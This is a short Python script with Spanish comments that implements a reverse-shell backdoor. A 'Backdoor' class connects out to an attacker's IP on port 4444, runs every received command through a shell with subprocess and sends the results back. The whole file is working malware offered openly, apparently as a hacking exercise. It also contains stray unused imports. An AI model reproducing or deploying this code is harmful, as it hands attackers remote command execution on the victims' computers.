#Esto es para que nos llegue la info al ordenador

 

import json

from pickle import TRUE

import socket

from sqlite3 import connect

import subprocess

from turtle import end_fill

 

class Backdoor:

    def __init__(self, ip, port):

        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        #IP y puerto del ordenata atacante

        self.connection.connect((ip, port))

 

#Estas dos funciones siguientes son para convertir los mensaje a JSON y que no pierdan su integridad

 

#Esta es la de envio de paquetes

 

    def envio_seguro(self, data):

        json_data = json.dumps(data)

        self.connection.send(json_data)




#Y esta es la del recibimiento de paquetes

 

    def recibimiento_seguro(self):

        json_data = ""

        while True:

            try:

                json_data = self.connection.recv(1024)

                return json.loads(json_data)

            except ValueError:

                    continue

 

    def ejecutar_comando(self,command):

        return subprocess.check_output(command, shell=True)

    def run(self):

    #Para recibir los datos desde el servidor atacado

        while True:

            command = self.connection.recv(1024)

            resultados_comando = self.ejecutar_comando(command)

            self.connection.send(resultados_comando)

        #connection.close()

 

#Enviamos datos

#connection.send("Conexion establecida")

 

puerta = Backdoor("IP del ordenador", 4444)

puerta.run()